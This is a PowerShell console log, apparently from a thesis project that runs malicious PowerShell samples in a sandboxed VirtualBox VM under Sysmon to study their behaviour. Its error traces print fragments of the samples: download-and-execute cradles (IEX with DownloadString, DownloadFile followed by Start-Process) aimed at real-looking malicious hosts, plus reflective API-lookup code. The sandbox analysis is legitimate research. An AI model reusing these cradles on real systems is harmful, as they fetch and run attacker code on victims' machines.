@@ -1,0 +1,2066 @@
+Windows PowerShell
+Copyright (C) Microsoft Corporation. Tutti i diritti riservati.
+
+Prova la nuova PowerShell multipiattaforma https://aka.ms/pscore6
+
+PS C:\Users\super> cd C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> .\exec-from-host.ps1
+
+"
+
+                   _
+ _ ____      _____| |__         _____  _____  ___
+| '_ \ \ /\ / / __| '_ \ _____ / _ \ \/ / _ \/ __|
+| |_) \ V  V /\__ \ | | |_____|  __/>  <  __/ (__
+| .__/ \_/\_/ |___/_| |_|      \___/_/\_\___|\___|
+|_|
+
+
+"
+Restoring snapshot 'updated-repo' (a3ce47cf-77a8-4c4c-a1ff-ba2a114dff7a)
+0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Waiting for VM "Malware-VM-Windows" to power on...
+VM "Malware-VM-Windows" has been successfully started.
+Waiting the VM...
+Waiting the VM...
+VM started?  True
+VM Started and copying inputs...
+VBOxManage : VBoxManage.exe: error: Error looking file system information for source
+'C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis\data\data\test', vrc=VERR_PATH_NOT_FOUND
+In C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis\exec-from-host.ps1:55 car:1
++ VBOxManage guestcontrol $VMName copyto --recursive --username unina - ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (VBoxManage.exe:..._PATH_NOT_FOUND:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+
+VM Executing setup script
+Directory is already in PATH: C:\\mimikatz\x64
+Directory is already in PATH: C:\\Sysmon
+Cmds found, skipping
+Powersploit found, skipping
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> ^C
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> ^C
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> ^C
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> .\exec-from-host.ps1
+
+"
+
+                   _
+ _ ____      _____| |__         _____  _____  ___
+| '_ \ \ /\ / / __| '_ \ _____ / _ \ \/ / _ \/ __|
+| |_) \ V  V /\__ \ | | |_____|  __/>  <  __/ (__
+| .__/ \_/\_/ |___/_| |_|      \___/_/\_\___|\___|
+|_|
+
+
+"
+Restoring snapshot 'updated-repo' (a3ce47cf-77a8-4c4c-a1ff-ba2a114dff7a)
+0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Waiting for VM "Malware-VM-Windows" to power on...
+VM "Malware-VM-Windows" has been successfully started.
+Waiting the VM...
+Waiting the VM...
+From https://github.com/cridin1/pwsh-execution-analysis
+   f920b9d..8333f1b  main       -> origin/main
+VM started?  True Updating f920b9d..8333f1b Fast-forward  .gitignore                                         |     6 +-  cmds/Get-BrowserInformation.ps1                    |   193 -  cmds/Invoke-CredentialPhisher.ps1                  |   641 -  cmds/Invoke-Mimikatz.ps1                           |   133 -  cmds/PowerView.ps1                                 | 20914 -------------------  exec-analysis-scripts.ps1                          |   138 +-  exec-from-host.ps1                                 |    21 +-  input-scripts/6.ps1                                |    30 +-  setup.ps1                                          |     5 +-  snapshots.yaml                                     |     6 +  .../sysmonconfig-excludes-only.xml                 |     0  .../sysmonconfig-export.xml                        |     0  12 files changed, 132 insertions(+), 21955 deletions(-)  delete mode 100644 cmds/Get-BrowserInformation.ps1  delete mode 100644 cmds/Invoke-CredentialPhisher.ps1  delete mode 100644 cmds/Invoke-Mimikatz.ps1  delete mode 100644 cmds/PowerView.ps1  create mode 100644 snapshots.yaml  rename {configs => sysmon-configs}/sysmonconfig-excludes-only.xml (100%)  rename {configs => sysmon-configs}/sysmonconfig-export.xml (100%)
+VM Started and copying inputs...
+VBOxManage : VBoxManage.exe: error: Error looking file system information for source
+'C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis\data\data\test', vrc=VERR_PATH_NOT_FOUND
+In C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis\exec-from-host.ps1:55 car:1
++ VBOxManage guestcontrol $VMName copyto --recursive --username unina - ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (VBoxManage.exe:..._PATH_NOT_FOUND:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+
+VM Executing setup script
+Directory is already in PATH: C:\\mimikatz\x64
+Directory is already in PATH: C:\\Sysmon
+Cmds found, skipping
+Powersploit found, skipping
+
+Name                           Version          Source           Summary
+----                           -------          ------           -------
+nuget                          2.8.5.208        https://onege... NuGet provider for the OneGet meta-package manager
+
+
+VM Executing the analysis...
+malware-vm\unina
+
+
+    Directory: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis
+
+                                                                                                                                      Mode                 LastWriteTime         Length Name                                                                                ----                 -------------         ------ ----                                                                                d-----        10/27/2024  11:56 AM                output
+    Directory: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/27/2024  11:56 AM                evtx
+d-----        10/27/2024  11:56 AM                txt
+d-----        10/27/2024  11:56 AM                xml
+
+Windows IP Configuration
+
+Successfully flushed the DNS Resolver Cache.
+
+
+System Monitor v15.12 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2023 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Loading configuration file with schema version 4.90
+Configuration file validated.
+Sysmon installed.
+SysmonDrv installed.
+Starting SysmonDrv.
+SysmonDrv started.
+Starting Sysmon..
+Sysmon started.
+Get-ChildItem : Cannot find path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test' because it does not exist.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:383 char:14
++     $lines = Get-ChildItem -Path $path_scripts -File
++              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\unina\...n-analysis\test:String) [Get-ChildItem], ItemNotFound
+   Exception
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+
+
+System Monitor v15.12 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2023 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Stopping Sysmon......
+Sysmon stopped.
+Sysmon removed.
+Stopping SysmonDrv.
+SysmonDrv stopped.
+SysmonDrv removed.
+Removing service files.
+
+
+Creating guest session as user 'unina'...
+Waiting for guest session to start...
+Successfully started guest session (ID 2)
+Copying from guest to host ...
+Source 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output.zip' is a file
+0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Closing guest session ...
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> .\exec-from-host.ps1
+
+"
+
+                   _
+ _ ____      _____| |__         _____  _____  ___
+| '_ \ \ /\ / / __| '_ \ _____ / _ \ \/ / _ \/ __|
+| |_) \ V  V /\__ \ | | |_____|  __/>  <  __/ (__
+| .__/ \_/\_/ |___/_| |_|      \___/_/\_\___|\___|
+|_|
+
+
+"
+Restoring snapshot 'updated-repo' (a3ce47cf-77a8-4c4c-a1ff-ba2a114dff7a)
+0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Waiting for VM "Malware-VM-Windows" to power on...
+VM "Malware-VM-Windows" has been successfully started.
+Waiting the VM...
+Waiting the VM...
+From https://github.com/cridin1/pwsh-execution-analysis
+   f920b9d..8333f1b  main       -> origin/main
+VM started?  True Updating f920b9d..8333f1b Fast-forward  .gitignore                                         |     6 +-  cmds/Get-BrowserInformation.ps1                    |   193 -  cmds/Invoke-CredentialPhisher.ps1                  |   641 -  cmds/Invoke-Mimikatz.ps1                           |   133 -  cmds/PowerView.ps1                                 | 20914 -------------------  exec-analysis-scripts.ps1                          |   138 +-  exec-from-host.ps1                                 |    21 +-  input-scripts/6.ps1                                |    30 +-  setup.ps1                                          |     5 +-  snapshots.yaml                                     |     6 +  .../sysmonconfig-excludes-only.xml                 |     0  .../sysmonconfig-export.xml                        |     0  12 files changed, 132 insertions(+), 21955 deletions(-)  delete mode 100644 cmds/Get-BrowserInformation.ps1  delete mode 100644 cmds/Invoke-CredentialPhisher.ps1  delete mode 100644 cmds/Invoke-Mimikatz.ps1  delete mode 100644 cmds/PowerView.ps1  create mode 100644 snapshots.yaml  rename {configs => sysmon-configs}/sysmonconfig-excludes-only.xml (100%)  rename {configs => sysmon-configs}/sysmonconfig-export.xml (100%)
+VM Started and copying inputs...
+VBOxManage : VBoxManage.exe: error: File copy failed
+In C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis\exec-from-host.ps1:55 car:1
++ VBOxManage guestcontrol $VMName copyto --recursive --username unina - ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (VBoxManage.exe: error: File copy failed:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+VBoxManage.exe: error: Opening host file "C:\Users\super\Desktop\tesi_magistrale\zircolite-test\data\data\test\0.ps1" failed:
+VERR_UNRESOLVED_ERROR
+VBoxManage.exe: error: Details: code VBOX_E_IPRT_ERROR (0x80bb0005), component GuestSessionWrap, interface IGuestSession
+VBoxManage.exe: error: Context: "enum RTEXITCODE __cdecl gctlHandleCopy(struct GCTLCMDCTX *,int,char **,bool)" at line 1840 of file
+VBoxManageGuestCtrl.cpp
+VBoxManage.exe: error: Opening host file "C:\Users\super\Desktop\tesi_magistrale\zircolite-test\data\data\test\0.ps1" failed:
+VERR_UNRESOLVED_ERROR.
+
+VM Executing setup script
+Directory is already in PATH: C:\\mimikatz\x64
+Directory is already in PATH: C:\\Sysmon
+Cmds found, skipping
+Powersploit found, skipping
+
+Name                           Version          Source           Summary
+----                           -------          ------           -------
+nuget                          2.8.5.208        https://onege... NuGet provider for the OneGet meta-package manager
+
+
+VM Executing the analysis...
+malware-vm\unina
+
+
+    Directory: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/27/2024  12:00 PM                output                                                                                                                                                                                                                                                                                                                                                              Directory: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/27/2024  12:00 PM                evtx
+d-----        10/27/2024  12:00 PM                txt
+d-----        10/27/2024  12:00 PM                xml
+
+Windows IP Configuration
+
+Successfully flushed the DNS Resolver Cache.
+
+
+System Monitor v15.12 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2023 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Loading configuration file with schema version 4.90
+Configuration file validated.
+Sysmon installed.
+SysmonDrv installed.
+Starting SysmonDrv.
+SysmonDrv started.
+Starting Sysmon..
+Sysmon started.
+Executing {0}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\0.ps1
+Executed {0}
+
+
+System Monitor v15.12 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2023 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Stopping Sysmon...
+Sysmon stopped.
+Sysmon removed.
+Stopping SysmonDrv.
+SysmonDrv stopped.
+SysmonDrv removed.
+Removing service files.
+
+
+Creating guest session as user 'unina'...
+Waiting for guest session to start...
+Successfully started guest session (ID 1)
+Copying from guest to host ...
+Source 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output.zip' is a file
+0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Closing guest session ...
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> .\exec-from-host.ps1
+
+"
+
+                   _
+ _ ____      _____| |__         _____  _____  ___
+| '_ \ \ /\ / / __| '_ \ _____ / _ \ \/ / _ \/ __|
+| |_) \ V  V /\__ \ | | |_____|  __/>  <  __/ (__
+| .__/ \_/\_/ |___/_| |_|      \___/_/\_\___|\___|
+|_|
+
+
+"
+Restoring snapshot 'updated-repo' (a3ce47cf-77a8-4c4c-a1ff-ba2a114dff7a)
+0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+Waiting for VM "Malware-VM-Windows" to power on...
+VM "Malware-VM-Windows" has been successfully started.
+Waiting the VM...
+Waiting the VM...
+From https://github.com/cridin1/pwsh-execution-analysis
+   f920b9d..8333f1b  main       -> origin/main
+VM started?  True Updating f920b9d..8333f1b Fast-forward  .gitignore                                         |     6 +-  cmds/Get-BrowserInformation.ps1                    |   193 -  cmds/Invoke-CredentialPhisher.ps1                  |   641 -  cmds/Invoke-Mimikatz.ps1                           |   133 -  cmds/PowerView.ps1                                 | 20914 -------------------  exec-analysis-scripts.ps1                          |   138 +-  exec-from-host.ps1                                 |    21 +-  input-scripts/6.ps1                                |    30 +-  setup.ps1                                          |     5 +-  snapshots.yaml                                     |     6 +  .../sysmonconfig-excludes-only.xml                 |     0  .../sysmonconfig-export.xml                        |     0  12 files changed, 132 insertions(+), 21955 deletions(-)  delete mode 100644 cmds/Get-BrowserInformation.ps1  delete mode 100644 cmds/Invoke-CredentialPhisher.ps1  delete mode 100644 cmds/Invoke-Mimikatz.ps1  delete mode 100644 cmds/PowerView.ps1  create mode 100644 snapshots.yaml  rename {configs => sysmon-configs}/sysmonconfig-excludes-only.xml (100%)  rename {configs => sysmon-configs}/sysmonconfig-export.xml (100%)
+VM Started and copying inputs...
+
+VM Executing setup script
+Directory is already in PATH: C:\\mimikatz\x64
+Directory is already in PATH: C:\\Sysmon
+Cmds found, skipping
+Powersploit found, skipping
+
+Name                           Version          Source           Summary
+----                           -------          ------           -------
+nuget                          2.8.5.208        https://onege... NuGet provider for the OneGet meta-package manager
+
+
+VM Executing the analysis...
+malware-vm\unina
+
+
+    Directory: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/27/2024  12:04 PM                output
+
+
+    Directory: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/27/2024  12:04 PM                evtx
+d-----        10/27/2024  12:04 PM                txt
+d-----        10/27/2024  12:04 PM                xml
+
+Windows IP Configuration
+
+Successfully flushed the DNS Resolver Cache.
+
+
+System Monitor v15.12 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2023 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Loading configuration file with schema version 4.90
+Configuration file validated.
+Sysmon installed.
+SysmonDrv installed.
+Starting SysmonDrv.
+SysmonDrv started.
+Starting Sysmon..
+Sysmon started.
+Executing {1}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\1.ps1
+Exception calling "DownloadString" with "1" argument(s): "The remote server returned an error: (404) Not Found."
+At line:1 char:1
++ iex(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+
+Executed {1}
+Executing {10}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\10.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\10.ps1:47←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  47 | ←[0m         if(←[36;1m(New-Object "Net.WebClient").DownloadFile('https://invitad←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadFile" with "2" argument(s): "The remote server returned an error: (404) Not Found."←[0m
+Executed {10}
+Executing {100}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\100.ps1
+Executed {100}
+Executing {101}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\101.ps1
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\101.ps1:8←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   8 | ←[0m . elWrapper = ←[36;1m[Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mUnable to find type [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter].←[0m
+←[31;1mExport-ModuleMember: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\101.ps1:12←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  12 | ←[0m ←[36;1mMicrosoft.PowerShell.Core\Export-ModuleMember -Function @()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe Export-ModuleMember cmdlet can only be called from inside a module.←[0m
+←[31;1mExport-ModuleMember: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\101.ps1:157←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 157 | ←[0m ←[36;1mMicrosoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpScan←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe Export-ModuleMember cmdlet can only be called from inside a module.←[0m
+Executed {101}
+Executing {102}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\102.ps1
+Executed {102}
+Executing {103}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\103.ps1
+Executed {103}
+Executing {104}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\104.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\104.ps1:9←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   9 | ←[0m ←[36;1m[char[]]$bytes = ([char[]]($WebClient.DownloadString("https://sixeigh←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadString" with "1" argument(s): "The SSL connection could not be established, see inner←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexception."←[0m
+←[31;1mInvoke-Expression: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\104.ps1:10←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  10 | ←[0m Invoke-Expression ←[36;1m($bytes -join '')←[0m;←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                   ~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot bind argument to parameter 'Command' because it is an empty string.←[0m
+Executed {104}
+Executing {105}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\105.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\105.ps1:4←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   4 | ←[0m ←[36;1m$n.DownloadFile("http://www.geocities.jp/lgxpoy6/zaavar.docx", "$env:←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadFile" with "2" argument(s): "The remote server returned an error: (403) Forbidden."←[0m
+←[31;1mStart-Process: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\105.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m ←[36;1mStart-Process "$env:temp\zaavar.docx"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThis command cannot be run due to the error: An error occurred trying to start process←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1m'C:\Users\unina\AppData\Local\Temp\zaavar.docx' with working directory 'C:\Windows\System32'. The system cannot←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mfind the file specified.←[0m
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\105.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mIEX $n.DownloadString('http://www.geocities.jp/frgrjxq1/f0921.ps1')←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadString" with "1" argument(s): "The remote server returned an error: (403) Forbidden."←[0m
+Executed {105}
+Executing {106}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\106.ps1
+Executed {106}
+Executing {107}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\107.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\107.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1mInvoke-Expression ((New-Object System.Net.WebClient).DownloadString('←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadString" with "1" argument(s): "No such host is known. (contacltinikk.top:80)"←[0m
+Executed {107}
+Executing {108}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\108.ps1
+Executed {108}
+Executing {109}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\109.ps1
+←[31;1mStart-Process: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\109.ps1:2←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   2 | ←[0m ←[36;1mStart-Process("$env:TEMP\puttyx86.exe")←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThis command cannot be run due to the error: An error occurred trying to start process←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1m'C:\Users\unina\AppData\Local\Temp\puttyx86.exe' with working directory 'C:\Windows\System32'. The specified←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexecutable is not a valid application for this OS platform.←[0m
+Executed {109}
+Executing {11}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\11.ps1
+←[31;1mInvalidOperation: ←[0m
+←[31;1m←[36;1mLine |←[0m
+←[31;1m←[36;1m←[36;1m 275 | ←[0m         ←[36;1m$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win←[0m .←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0m
+←[31;1m←[36;1mLine |←[0m
+←[31;1m←[36;1m←[36;1m 277 | ←[0m         ←[36;1m$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleH←[0m .←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0m
+←[31;1m←[36;1mLine |←[0m
+←[31;1m←[36;1m←[36;1m 278 | ←[0m         ←[36;1m$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr←[0m .←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0m
+←[31;1m←[36;1mLine |←[0m
+←[31;1m←[36;1m←[36;1m 280 | ←[0m         ←[36;1m$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mNew-Object: ←[0m
